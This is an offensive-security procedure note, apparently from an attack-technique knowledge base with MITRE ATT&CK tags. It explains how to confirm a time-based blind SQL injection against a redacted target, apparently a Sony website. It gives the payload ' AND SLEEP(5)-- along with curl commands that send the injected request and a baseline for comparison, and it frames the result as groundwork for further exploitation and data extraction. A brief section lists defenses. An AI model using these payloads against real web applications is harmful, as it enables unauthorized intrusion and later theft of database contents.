---
tags:
  - sqli
  - blind-sqli
  - time-based
  - confirmation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-sleep-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:04.889Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 64a49fde-b708-4b7c-b642-e8cfacffe8e3
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-Time-Based-SQL-Injection-with-Sleep

## Summary

This procedure verifies a time-based blind SQL injection vulnerability by injecting a sleep function into a web parameter, causing a measurable delay in database response without producing visible output, ideal for black-box testing of public-facing applications.

## Description

In a time-based blind SQL injection, attackers exploit unsanitized inputs to execute SQL code that delays the database response based on conditions, allowing inference of data through timing. This procedure targets a vulnerable parameter (e.g., ███ in a Sony website) by appending a sleep payload like ' AND SLEEP(5)--. Prerequisites include access to the target URL and a tool like curl for sending crafted requests. Expected outcomes include confirmed vulnerability via response delays, enabling further exploitation.

## Requirements

1. Network access to the target web application (https://████)
2. Basic understanding of SQL syntax and HTTP requests
3. curl or similar HTTP client installed

## Defense

Defensive measures and detection strategies:

- Implement prepared statements or parameterized queries to sanitize inputs
- Use web application firewalls (WAFs) to detect anomalous delays or SQL keywords in requests
- Monitor database query logs for unexpected sleep or delay functions

## Objectives

1. Confirm SQL injection vulnerability without direct data leakage
2. Establish baseline for automated exploitation
3. Identify potential for data extraction in blind scenarios

## Instructions

### Step 1: Craft and Send Injection Payload

**Context**: Prepare an HTTP request injecting the sleep function into the vulnerable parameter to test for delay.

**Command** ([[commands/curl-sleep-injection]]):
```bash
curl "https://████?███=value' AND SLEEP(5)--" -w "%{time_total}s\n"
```

> This command sends a GET request with the payload in the ███ parameter. The -w flag measures total response time. A delay of ~5 seconds indicates successful injection as the database executes SLEEP(5).

### Step 2: Analyze Response Timing

**Context**: Compare response times between normal and injected requests to validate the vulnerability.

**Command** ([[commands/curl-normal-request]]):
```bash
curl "https://████?███=value" -w "%{time_total}s\n"
```

> Run a baseline request first (should be <1s), then the injected one. Significant timing difference confirms blind SQLi.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sleep-injection]]
- [[commands/curl-normal-request]]

## Tools Used


## Tags

- sqli
- blind-sqli
- time-based
